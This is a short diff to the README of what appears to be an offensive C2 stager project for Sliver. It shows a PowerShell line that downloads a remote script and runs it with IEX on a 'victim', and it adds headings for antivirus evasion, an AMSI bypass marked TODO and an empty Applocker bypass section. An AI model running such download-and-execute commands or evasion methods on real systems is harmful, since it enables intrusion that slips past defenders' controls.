@@ -188,3 +188,13 @@ On the victim, the following command executes the download and staging of the ag
 (New-Object System.Net.WebClient).DownloadString('https://some-server/unsuspicious.txt') | IEX)
 ```
 ![Catch the session with sliver](./doc/img/sliver002.png)
+
+## AV Evasion
+
+The stager implements basic av evasion like process sleep, and check for api's that av engines usally don't implement.
+
+## AMSI Bypass
+
+TODO: Find c# implementations for the assembly itsself instead of utilizing the droper
+
+## Applocker Bypass
